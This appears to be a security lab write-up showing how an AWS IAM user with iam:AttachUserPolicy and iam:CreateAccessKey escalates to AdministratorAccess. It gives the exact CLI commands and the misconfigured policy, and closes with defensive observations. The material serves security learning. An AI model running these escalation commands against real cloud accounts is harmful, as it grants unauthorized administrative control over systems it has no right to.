# IAM Privilege Escalation – Attack Steps

## Objective
Simulate a privilege escalation attack where a low-privileged IAM user gains administrator access.

---

## Initial Conditions
User: low-priv-user

Permissions:
- s3:ListAllMyBuckets
- iam:AttachUserPolicy
- iam:CreateAccessKey

---

## Step 1 – Console Attempt (Failed)

Attempted IAM access via AWS Console.

Access denied due to missing:
- iam:ListUsers
- iam:ListAccessKeys

### Observation
Console requires additional permissions not needed by API.

---

## Step 2 – Create Access Key

```bash
aws iam create-access-key --user-name low-priv-user
```

---

## Step 3 – Configure CLI

```bash
aws configure
```

---

## Step 4 – Verify Identity

```bash
aws sts get-caller-identity
```

---

## Step 5 – Privilege Escalation

```bash
aws iam attach-user-policy \
--user-name low-priv-user \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

## Step 6 – Verify Escalation

```bash
aws iam list-attached-user-policies --user-name low-priv-user
```

Expected result:
```
AdministratorAccess
```

---

## Outcome
The user successfully gained full administrative privileges.

---

## Key Exploit

```json
{
  "Effect": "Allow",
  "Action": "iam:AttachUserPolicy",
  "Resource": "*"
}
```

---

## Key Observations
- UI restrictions do not enforce security
- API/CLI access bypasses console limitations
- IAM modification permissions are highly sensitive
- Small misconfigurations can lead to full compromise